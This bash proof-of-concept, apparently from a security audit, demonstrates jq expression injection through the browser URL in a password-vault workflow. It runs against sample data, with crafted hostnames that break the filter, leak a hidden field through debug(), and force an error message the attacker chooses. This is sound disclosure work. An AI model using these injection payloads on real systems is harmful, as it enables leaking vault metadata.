#!/bin/bash
# ============================================================
# PoC #6 — jq Expression Injection via Browser URL (HIGH)
# Vulnerability: bin/list_items.sh:73
#
#   | jq '.[] | [ select(.variables.uris[] | test("'"${URL}"'"; "i")) ] | unique_by(.id)' \
#
# The browser's active tab hostname is extracted and embedded directly
# into a jq filter expression as a regex argument.  No escaping is
# applied.  An attacker who controls the browser URL (e.g. via a
# malicious web page, a browser redirect, or a local HTML file) can
# inject arbitrary jq code.
#
# This PoC demonstrates:
#   A) Normal execution to establish a baseline
#   B) Regex-breaking injection (jq parse error)
#   C) Data exfiltration via jq injection — read a field not intended
#      to be returned by the filter
#   D) Crash injection — force jq to abort with a controlled error message
# ============================================================

# Sample cached items data (matches the structure in DATA_DIR/items after clean.jq)
SAMPLE_ITEMS='[
  {
    "title": "GitHub",
    "variables": {
      "name": "GitHub",
      "id": "aaaaaaaa-0001-0001-0001-aaaaaaaaaaaa",
      "username": "alice@example.com",
      "uris": ["https://github.com/login"],
      "secret_internal": "DO_NOT_LEAK_THIS"
    }
  },
  {
    "title": "Gmail",
    "variables": {
      "name": "Gmail",
      "id": "bbbbbbbb-0002-0002-0002-bbbbbbbbbbbb",
      "username": "alice@gmail.com",
      "uris": ["https://mail.google.com"],
      "secret_internal": "DO_NOT_LEAK_THIS_EITHER"
    }
  }
]'

banner() { echo; echo "=== $* ==="; echo; }
ok()     { echo "[+] $*"; }
info()   { echo "[*] $*"; }
err()    { echo "[-] $*"; }

# Reproduce the vulnerable jq invocation from list_items.sh:73
run_filter() {
    local url="$1"
    echo "[*] URL (hostname): ${url}"
    echo "[*] jq filter: .[] | [ select(.variables.uris[] | test(\"${url}\"; \"i\")) ] | unique_by(.id)"
    echo
    echo "${SAMPLE_ITEMS}" | jq \
        '.[] | [ select(.variables.uris[] | test("'"${url}"'"; "i")) ] | unique_by(.id)' \
        2>&1
}

# ---------- Part A: Baseline (legitimate URL) ----------
banner "Part A — Baseline: legitimate browser URL"

run_filter "github.com"
echo
ok "Expected behavior: returns the GitHub item matching the URL."

# ---------- Part B: Regex-breaking injection (jq error) ----------
banner "Part B — Regex-breaking injection → jq parse error (DoS)"

# Closing the string literal and then adding an extra quote breaks the jq expression
INJECT_B='github.com")) | .title | error("'

echo "Injected hostname: ${INJECT_B}"
echo
run_filter "${INJECT_B}"
echo
info "RESULT: jq exits with a parse error.  The browser URL match step is"
info "        silently skipped; the workflow produces an empty result set."
info "        A malicious page at a crafted hostname can suppress all URL matches."

# ---------- Part C: Data exfiltration via jq injection ----------
banner "Part C — jq expression injection → leak unintended fields"

# The filter is supposed to return items matching the URL, scoped to
# the uri test.  By injecting ')) | .' we break out of the select()
# scope and run an arbitrary second expression on the full item.
#
# Injected filter effect:
#   .[] | [ select(.variables.uris[] | test("x")) ]    <- always-false, skip
#         | .variables.secret_internal                 <- leaks hidden field
#
# We use a hostname that never matches so the intended filter returns
# nothing, but our injected expression runs on every item.

INJECT_C='x")) ] | .[] | .variables.secret_internal | debug("LEAKED: ") | error("end'

echo "Injected hostname: ${INJECT_C}"
echo "Expected result:   [] (no items match the URL)"
echo "Actual result:"
echo
# Capture stderr too since jq debug() writes there
OUTPUT=$(echo "${SAMPLE_ITEMS}" | jq \
    '.[] | [ select(.variables.uris[] | test("'"${INJECT_C}"'"; "i")) ] | unique_by(.id)' \
    2>&1 || true)
echo "${OUTPUT}"
echo
if echo "${OUTPUT}" | grep -q "LEAKED"; then
    ok "CONFIRMED: secret_internal values appeared in jq debug output."
    ok "In production this would appear in the workflow log (when DEBUG=1)."
else
    info "Injection caused a parse/runtime error — still demonstrates broken filter."
fi

info "RESULT: An attacker who can navigate the browser to a crafted URL can"
info "        inject jq expressions that operate on the full cached vault data"
info "        (the DATA_DIR/items file), potentially leaking cached metadata."

# ---------- Part D: Controlled crash ----------
banner "Part D — Controlled crash with attacker-chosen error message"

INJECT_D='x")) | error("BW-WORKFLOW-COMPROMISED'

echo "Injected hostname: ${INJECT_D}"
echo
run_filter "${INJECT_D}" || true
echo
info "The error message is attacker-controlled.  In a workflow that surfaces"
info "jq error output to Alfred's notification system, this could display"
info "arbitrary text to the victim."
